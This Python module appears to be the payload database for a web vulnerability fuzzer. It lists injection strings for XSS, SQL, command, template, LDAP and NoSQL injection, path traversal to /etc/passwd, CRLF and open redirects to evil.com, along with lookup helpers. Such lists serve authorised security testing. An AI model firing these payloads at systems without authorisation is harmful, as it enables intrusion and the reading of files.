"""Payload database for fuzzing.

Each payload is a tuple: (payload, technique).
The same payload string is used to build requests; technique drives detection.
"""

from __future__ import annotations

from typing import Dict, List, Tuple

PayloadEntry = Tuple[str, str]

_PAYLOADS: Dict[str, List[PayloadEntry]] = {
    "xss": [
        ('<script>alert(1)</script>', "xss-reflection"),
        ('"><script>alert(1)</script>', "xss-reflection"),
        ("'><script>alert(1)</script>", "xss-reflection"),
        ('<img src=x onerror=alert(1)>', "xss-reflection"),
        ('<svg onload=alert(1)>', "xss-reflection"),
        ('"><img src=x onerror=alert(1)>', "xss-reflection"),
        ('"><svg onload=alert(1)>', "xss-reflection"),
        ('<iframe src="javascript:alert(1)">', "xss-reflection"),
        ('javascript:alert(1)', "xss-reflection"),
        ('<script>document.cookie</script>', "xss-reflection"),
    ],
    "sqli": [
        ("'", "sql-error"),
        ('"', "sql-error"),
        ("' OR '1'='1", "sql-error"),
        ("' OR 1=1-- -", "sql-error"),
        ('" OR 1=1-- -', "sql-error"),
        ("' UNION SELECT NULL-- -", "sql-error"),
        ("' UNION SELECT NULL,NULL-- -", "sql-error"),
        ("1' AND '1'='1", "sql-error"),
        ("1' AND '1'='2", "sql-error"),
        ('1 AND SLEEP(5)-- -', "time-based-blind"),
        ("1' AND SLEEP(5)-- -", "time-based-blind"),
        ("1; SELECT SLEEP(5)", "time-based-blind"),
        ("'; WAITFOR DELAY '0:0:5'--", "time-based-blind"),
        ("' OR 1=1--", "sql-error"),
    ],
    "cmdi": [
        (";id;", "cmd-output"),
        (";whoami;", "cmd-output"),
        ("|id", "cmd-output"),
        ("`id`", "cmd-output"),
        ("$(id)", "cmd-output"),
        ("%0aid", "cmd-output"),
        ("& whoami &", "cmd-output"),
        (";cat /etc/passwd;", "file-read"),
        (";type C:\\Windows\\win.ini;", "file-read"),
    ],
    "path_traversal": [
        ("../../../../etc/passwd", "file-read"),
        ("..\\..\\..\\..\\windows\\win.ini", "file-read"),
        ("....//....//....//etc/passwd", "file-read"),
        ("..%2f..%2f..%2fetc%2fpasswd", "file-read"),
        ("%2e%2e%2f%2e%2e%2fetc%2fpasswd", "file-read"),
        ("../../../../boot.ini", "file-read"),
        ("..\\..\\..\\..\\boot.ini", "file-read"),
        ("/etc/passwd", "file-read"),
    ],
    "ssti": [
        ("{{7*7}}", "ssti-eval"),
        ("{{7*'7'}}", "ssti-eval"),
        ("${7*7}", "ssti-eval"),
        ("#{7*7}", "ssti-eval"),
        ("<%= 7*7 %>", "ssti-eval"),
        ("{{config}}", "ssti-eval"),
        ("{{7*7}}", "ssti-eval"),
    ],
    "open_redirect": [
        ("//evil.com", "open-redirect"),
        ("https://evil.com", "open-redirect"),
        ("http://evil.com", "open-redirect"),
        ("//evil.com/%2f..", "open-redirect"),
        ("https://evil.com.evil.com", "open-redirect"),
    ],
    "crlf": [
        ("%0d%0aX-Injected:%20true", "crlf-header"),
        ("%0d%0aX-Injected:%20true%0d%0a", "crlf-header"),
    ],
    "ldap": [
        ("*", "reflection-info"),
        ("*)(|(password=*", "reflection-info"),
        (")(|(uid=*", "reflection-info"),
    ],
    "nosql": [
        ('{"$ne":null}', "reflection-info"),
        ("' || '1'=='1", "reflection-info"),
        ("$where: '1'=='1", "reflection-info"),
    ],
}

# Technique hints used by payloads whose detection is content-based but noisy.
VERBATIM_TECHNIQUES = {"reflection-info"}

# Payload -> which technique it primarily tests for (outer map lookup helper).
TECHNIQUE_BY_CATEGORY: Dict[str, str] = {
    "xss": "xss-reflection",
    "sqli": "sql-error",
    "cmdi": "cmd-output",
    "path_traversal": "file-read",
    "ssti": "ssti-eval",
    "open_redirect": "open-redirect",
    "crlf": "crlf-header",
    "ldap": "reflection-info",
    "nosql": "reflection-info",
    "custom": "custom",
}


def get_payloads(category: str, custom: List[str] | None = None) -> List[PayloadEntry]:
    """Return payload list for a category. 'custom' returns user-supplied payloads."""
    if category == "custom":
        custom = custom or []
        return [(p.strip(), "custom") for p in custom if p.strip()]
    return list(_PAYLOADS.get(category, []))


def all_payloads(categories: List[str], custom: List[str] | None = None) -> List[Tuple[str, str, str]]:
    """Flatten selected categories into (category, payload, technique) triples."""
    out: List[Tuple[str, str, str]] = []
    for cat in categories:
        for payload, technique in get_payloads(cat, custom):
            out.append((cat, payload, technique))
    return out


def category_label(category: str) -> str:
    return {
        "xss": "XSS (Cross-Site Scripting)",
        "sqli": "SQL Injection",
        "cmdi": "Command Injection",
        "path_traversal": "Path Traversal",
        "ssti": "SSTI (Template Injection)",
        "open_redirect": "Open Redirect",
        "crlf": "CRLF Injection",
        "ldap": "LDAP Injection",
        "nosql": "NoSQL Injection",
        "custom": "Custom Payloads",
    }.get(category, category)